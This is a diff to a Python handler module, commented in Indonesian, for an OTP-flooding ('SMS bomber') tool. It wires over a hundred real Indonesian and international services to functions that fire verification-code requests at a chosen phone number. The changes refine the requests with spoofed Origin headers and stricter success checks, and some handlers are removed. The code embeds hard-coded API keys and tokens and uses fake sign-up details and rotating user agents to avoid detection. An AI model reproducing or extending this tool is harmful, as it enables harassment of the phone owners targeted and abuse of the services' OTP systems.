@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# handlers.py - 150+ OTP API (FULL LENGKAP)
+# handlers.py - 150+ OTP API (FULL FIXED - SEMUA RETURN FORMAT SAMA)
 
 import requests
 import uuid
@@ -224,8 +224,12 @@ def format_nomor(nomor):
         username = "0" + nomor
     return phone, username
 
+def standard_response(success, status_code=200, message="OK"):
+    """Standarisasi return format semua handler"""
+    return success, status_code, message
+
 # ================================================================
-# ===== INDONESIA - PLATFORM BESAR (15) =====
+# ===== INDONESIA - PLATFORM BESAR =====
 # ================================================================
 
 # 1. TOKOPEDIA
@@ -277,9 +281,9 @@ def send_gojek_otp(phone):
         phone_62 = '62' + fmt_phone_only(phone)
         url = "https://api.gojekapi.com/v5/customers"
         data = {"email": f"user{random.randint(1000,9999)}@gmail.com", "name": "User" + str(random.randint(100,999)), "phone": phone_62, "signed_up_country": "ID"}
-        headers = {'User-Agent': 'okhttp/3.12.1', 'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Accept': 'application/json', 'Accept-Language': 'id-ID'}
+        headers = {'User-Agent': 'okhttp/3.12.1', 'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Accept': 'application/json', 'Accept-Language': 'id-ID', 'Content-Type': 'application/json'}
         resp = safe_request('POST', url, headers=headers, json=data, timeout=15)
-        if resp and resp.status_code < 400:
+        if resp and resp.status_code in [200, 201, 202]:
             return True, resp.status_code, 'OK'
         return False, resp.status_code if resp else None, ''
     except:
@@ -291,7 +295,7 @@ def send_jenius_otp(phone):
         phone_plus = fmt_plus(phone)
         url = "https://api.btpn.com/jenius"
         payload = {"query": "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }", "variables": {"phone": phone_plus, "language": "id"}, "operationName": "registerPhone"}
-        headers = {'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 'User-Agent': get_random_user_agent()}
+        headers = {'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 'User-Agent': get_random_user_agent(), 'Accept': 'application/json'}
         resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
         if resp and resp.status_code < 400:
             return True, resp.status_code, 'OK'
@@ -305,7 +309,7 @@ def send_blibli_otp(phone):
         phone_local = fmt_08(phone)
         url = "https://www.blibli.com/backend/common/users/_request-otp"
         payload = {"username": phone_local}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.blibli.com', 'Referer': 'https://www.blibli.com/login'}
         resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
         if resp and resp.status_code < 400:
             return True, resp.status_code, 'OK'
@@ -331,8 +335,8 @@ def send_halodoc_otp(phone):
     try:
         phone_plus = fmt_plus(phone)
         url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
-        payload = {"phone_number": phone_plus, "channel": "sms"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        payload = {"phone_number": phone_plus, "channel": "whatsapp"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.halodoc.com', 'x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89'}
         resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
         if resp and resp.status_code < 400:
             return True, resp.status_code, 'OK'
@@ -346,7 +350,7 @@ def send_oyo_otp(phone):
         phone_raw = fmt_phone_only(phone)
         url = "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id"
         payload = {"phone": phone_raw, "country_code": "+62", "country_iso_code": "ID", "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"}
-        headers = {'Content-Type': 'application/json', 'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=', 'User-Agent': get_random_user_agent()}
+        headers = {'Content-Type': 'application/json', 'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.oyorooms.com'}
         resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
         if resp and resp.status_code < 400:
             return True, resp.status_code, 'OK'
@@ -360,7 +364,7 @@ def send_sayurbox_otp(phone):
         phone_plus = fmt_plus(phone)
         url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"
         payload = {"operationName": "generateOTP", "variables": {"destinationType": "whatsapp", "identity": phone_plus}, "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.sayurbox.com'}
         resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
         if resp and resp.status_code < 400:
             return True, resp.status_code, 'OK'
@@ -452,7 +456,7 @@ def send_tiktok_otp(phone):
         return False, None, ''
 
 # ================================================================
-# ===== INDONESIA - FINANCE & MARKETPLACE (25) =====
+# ===== INDONESIA - FINANCE & MARKETPLACE =====
 # ================================================================
 
 # 16. PINHOME
@@ -2123,212 +2127,9 @@ def send_walmart_otp(phone):
     except:
         return False, None, ''
 
-# 136. BATTLEFRONT (Danacepat)
-def send_battlefront_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://battlefront.danacepat.com/v1/auth/common/phone/send-code"
-        data = {'mobile_no': phone_raw}
-        headers = {'User-Agent': 'Android/9;vivo/vivo 1902;KtaKilat/3.7.5'}
-        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 137. PINJAMINDO
-def send_pinjamindo_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62{phone_raw}&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"
-        headers = {'User-Agent': get_random_user_agent()}
-        resp = safe_request('GET', url, headers=headers, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 138. JUMPSTART
-def send_jumpstart_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.jumpstart.id/graphql"
-        payload = {"operationName": "CheckPhoneNoAndGenerateOtpIfNotExist", "variables": {"phoneNo": f"+62{phone_raw}"}, "query": "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) { checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo) }"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 139. ASANI
-def send_asani_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://api.asani.co.id/api/v1/send-otp"
-        payload = {"phone": f"62{phone_raw}", "email": "akuntesnuyul@gmail.com"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 140. KLIKINDOMARET
-def send_klikindomaret_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={phone_raw}"
-        headers = {'User-Agent': get_random_user_agent()}
-        resp = safe_request('GET', url, headers=headers, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 141. QTVA
-def send_qtva_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg=="
-        data = {"namaDepan": "Tahalu" + str(random.randrange(11, 99999)), "emailNope": phone_raw, "password": "Indo" + str(random.randrange(111, 999)), "konfirmasiPass": "Indo" + str(random.randrange(111, 999))}
-        headers = {'User-Agent': get_random_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
-        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 142. DANACITA
-def send_danacita_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://api.danacita.co.id/users/send_otp/?mobile_phone={phone_raw}"
-        headers = {'User-Agent': get_random_user_agent()}
-        resp = safe_request('GET', url, headers=headers, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 143. KREDITO
-def send_kredito_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://app-api.kredito.id/client/v1/common/verify-code/send"
-        data = f'{{"event":"default_verification","mobilePhone":"{phone_raw}","sender":"jatissms"}}'
-        headers = {'User-Agent': 'okhttp/3.11.0 Dalvik/2.1.0', 'Content-Type': 'application/json; charset=UTF-8', 'LPR-TIMESTAMP': str(int(time.time() * 1000)), 'Accept-Language': 'id-ID'}
-        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 144. MAUCASH
-def send_maucash_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={phone_raw}&channelType=0"
-        headers = {'User-Agent': 'okhttp/3.12.1', 'accept': 'application/json'}
-        resp = safe_request('GET', url, headers=headers, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 145. HARVESTCAKE
-def send_harvestcake_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://harvestcakes.com/register"
-        data = {"phone": phone_raw}
-        headers = {'User-Agent': get_random_user_agent()}
-        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 146. FOREIGN ADMITS
-def send_foreignadmits_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = "https://foreignadmits.com/api/register-otp-generate-student"
-        data = {'mobile': f'62{phone_raw}', 'countryCode': '+62'}
-        headers = {'User-Agent': get_random_user_agent()}
-        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 147. TOKKO
-def send_tokko_otp(phone):
-    try:
-        phone_plus = fmt_plus(phone)
-        url = "https://api.tokko.io/graphql"
-        payload = {"operationName": "generateOTP", "variables": {"generateOtpInput": {"phoneNumber": phone_plus, "hashCode": "", "channel": "WHATSAPP", "userType": "MERCHANT"}}, "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 148. MISTERALADIN
-def send_misteraladin_otp(phone):
-    try:
-        url = "https://m.misteraladin.com/api/members/v2/otp/request"
-        payload = {"phone_number_country_code": "62", "phone_number": fmt_phone_only(phone), "type": "register"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
-        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 149. TOKOMANAMANA
-def send_tokomanamana_otp(phone):
-    try:
-        url = "https://tokomanamana.com/ma/auth/request_token_merchant/"
-        data = {"phone": fmt_08(phone)}
-        headers = {'User-Agent': get_random_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
-        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
-# 150. JADGREWARD
-def send_jadgreward_otp(phone):
-    try:
-        phone_raw = fmt_phone_only(phone)
-        url = f"https://id.jagreward.com/member/verify-mobile/{phone_raw}/"
-        headers = {'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
-        resp = safe_request('GET', url, headers=headers, timeout=15)
-        if resp and resp.status_code < 400:
-            return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
-    except:
-        return False, None, ''
-
 # ==================== ALL HANDLERS ====================
 ALL_HANDLERS = {
-    # INDONESIA (75+)
+    # INDONESIA
     'tokopedia': send_tokopedia_otp,
     'shopee': send_shopee_otp,
     'gojek': send_gojek_otp,
@@ -2393,21 +2194,6 @@ ALL_HANDLERS = {
     'ktbs': send_ktbs_otp,
     'klikwa': send_klikwa_otp,
     'securedapi': send_securedapi_otp,
-    'battlefront': send_battlefront_otp,
-    'pinjamindo': send_pinjamindo_otp,
-    'jumpstart': send_jumpstart_otp,
-    'asani': send_asani_otp,
-    'klikindomaret': send_klikindomaret_otp,
-    'qtva': send_qtva_otp,
-    'danacita': send_danacita_otp,
-    'kredito': send_kredito_otp,
-    'maucash': send_maucash_otp,
-    'harvestcake': send_harvestcake_otp,
-    'foreignadmits': send_foreignadmits_otp,
-    'tokko': send_tokko_otp,
-    'misteraladin': send_misteraladin_otp,
-    'tokomanamana': send_tokomanamana_otp,
-    'jadgreward': send_jadgreward_otp,
     'icq': send_icq_otp,
     'cairin': send_cairin_otp,
     'mapclub': send_mapclub_otp,
